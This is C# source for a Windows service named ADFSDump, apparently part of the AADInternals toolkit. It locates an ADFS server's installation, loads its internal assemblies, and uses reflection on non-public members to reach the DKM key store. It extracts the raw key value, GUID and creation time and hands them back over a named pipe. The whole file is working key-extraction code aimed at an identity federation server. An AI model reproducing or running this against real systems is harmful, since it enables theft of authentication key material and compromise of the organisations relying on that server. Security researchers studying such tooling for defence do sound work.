using System;
using System.IO.Pipes;
using System.IO;
using System.Reflection;
using System.ServiceProcess;
using System.Threading;
using System.Management;

namespace AADInternals
{
    public partial class ADFSDump : ServiceBase
    {

        protected override void OnStart(string[] args)
        {
            new Thread(Service).Start();
        }

        private static void Service()
        {
            string configuration = "";

            // First get the path to ADFS server and load assemblies
            ManagementObjectCollection col = (new ManagementObjectSearcher("select * from win32_service where name=\"adfssrv\"")).Get();
            string path = null;
            foreach (ManagementObject mo in col)
            {
                path = mo["PathName"].ToString();
                break;
            }
            path = path.Substring(0, path.LastIndexOf("\\"));
            Assembly adfsAssembly = Assembly.LoadFrom(String.Format("{0}\\{1}", path, "Microsoft.IdentityServer.Service.dll"));
            Assembly misAssembly = Assembly.LoadFrom(String.Format("{0}\\{1}", path, "Microsoft.IdentityServer.dll"));
            Assembly dkmAssembly = Assembly.LoadFrom(String.Format("{0}\\{1}", path, "Microsoft.IdentityServer.Dkm.dll"));

            //
            // Wait for the configuration
            //
            using (NamedPipeServerStream pipeServer = new NamedPipeServerStream("AADInternals-out", PipeDirection.InOut))
            {
                // Wait for a client to connect
                Console.Write("Waiting for client connection...");
                pipeServer.WaitForConnection();

                try
                {
                    // Read user input and send that to the client process.
                    using (StreamReader sr = new StreamReader(pipeServer))
                    {
                        while (!sr.EndOfStream)
                            configuration += sr.ReadLine();
                    }

                }
                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
                catch (IOException e)
                {
                    Console.WriteLine("ERROR: {0}", e.Message);
                }
            }

            //
            // Get the key
            //
            string returnValue;
            try
            {
                // Load serializer class
                Type serializer = misAssembly.GetType("Microsoft.IdentityServer.PolicyModel.Configuration.Utility");

                // Get type of Microsoft.IdentityServer.PolicyModel.Configuration.ServiceSettingsData using .NET Reflection
                Type serviceSettingsDataType = misAssembly.GetType("Microsoft.IdentityServer.PolicyModel.Configuration.ServiceSettingsData");

                // Convert the configuration xml to object .NET Reflection
                //  public static T Deserialize<T>(string xmlData) where T : ContractObject
                MethodInfo methodInfo = serializer.GetMethod("Deserialize", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
                MethodInfo genericMethod = methodInfo.MakeGenericMethod(serviceSettingsDataType);
                var configObject = genericMethod.Invoke(null, new object[] { configuration });

                // Get type of Microsoft.IdentityServer.Service.Configuration.AdministrationServiceState using .NET Reflection
                Type srvStateType = adfsAssembly.GetType("Microsoft.IdentityServer.Service.Configuration.AdministrationServiceState");

                // Get type of Microsoft.IdentityServer.Dkm.Key using .NET Reflection
                Type dkmKeyType = dkmAssembly.GetType("Microsoft.IdentityServer.Dkm.Key");

                // Use the configuration object
                methodInfo = srvStateType.GetMethod("UseGivenConfiguration", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
                methodInfo.Invoke(srvStateType, new object[] { configObject });

                // Get instance of Microsoft.IdentityServer.Service.Configuration.AdministrationServiceState
                object srvState = srvStateType.GetField("_state", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static).GetValue(srvStateType);

                // Get instance of Microsoft.IdentityServer.CertificateManagement.DkmDataProtector
                object dkm = srvStateType.GetField("_certificateProtector", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static).GetValue(srvState);

                //  Get Instance of Microsoft.IdentityServer.Dkm.IDKM
                object dkmIKM = dkm.GetType().GetField("_dkm", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static).GetValue(dkm);

                // Get the key by invoking EnumerateKeys
                methodInfo = dkmIKM.GetType().GetMethod("EnumerateKeys", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
                //object[] keys  = (object[]) methodInfo.Invoke(dkmIKM, null);
                var keys = methodInfo.Invoke(dkmIKM, null);

                // Get the key
                methodInfo = keys.GetType().GetMethod("get_Item", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
                var keyItem = methodInfo.Invoke(keys, new object[] { 0 });

                // Get values
                PropertyInfo propertyInfo = dkmKeyType.GetProperty("Guid");
                var keyGuid = propertyInfo.GetValue(keyItem);
                string strKeyGuid = keyGuid.ToString();

                propertyInfo = dkmKeyType.GetProperty("KeyValue");
                var keyValue = propertyInfo.GetValue(keyItem);
                string strKeyValue = BitConverter.ToString((byte[])keyValue).Replace("-", "");

                propertyInfo = dkmKeyType.GetProperty("WhenCreated");
                var keyCreated = propertyInfo.GetValue(keyItem);
                DateTime dtKeyCreated = ((DateTime)keyCreated).ToUniversalTime();

                returnValue = String.Format("{{ \"Key\": \"{0}\",\"Guid\": \"{1}\",\"Created\": \"{2:u}\" }}", strKeyValue, strKeyGuid, dtKeyCreated);
            }
            catch (Exception e)
            {
                returnValue = String.Format("{{\"Error\": \"{0}\"}}", e.InnerException.Message.Replace(System.Environment.NewLine, ""));
            }

            //
            // Send the response
            //

            using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "AADInternals-in", PipeDirection.InOut))
            {
                // Connect
                pipeClient.Connect();

                try
                {
                    using (StreamWriter sw = new StreamWriter(pipeClient))
                    {
                        sw.AutoFlush = true;
                        sw.WriteLine(returnValue);
                    }
                }
                catch (IOException e){};
            }
        }
    }
}
